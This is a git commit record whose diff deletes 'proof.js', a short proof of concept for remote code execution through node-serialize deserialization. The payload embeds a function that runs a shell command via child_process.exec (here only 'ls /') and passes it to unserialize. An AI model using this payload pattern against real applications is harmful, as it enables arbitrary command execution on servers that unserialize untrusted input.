ca1bebd1949cef4b37a8de7d743071b1f696c57d
irwansyah <ryirwansyah@gmail.com>
2021-10-06 17:44:31 +0700

    Delete proof.js

--- proof.js
+++
@@ -1,5 +0,0 @@
-var serialize = require('node-serialize');
-var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
-
-console.log(btoa(payload))
-serialize.unserialize(payload);
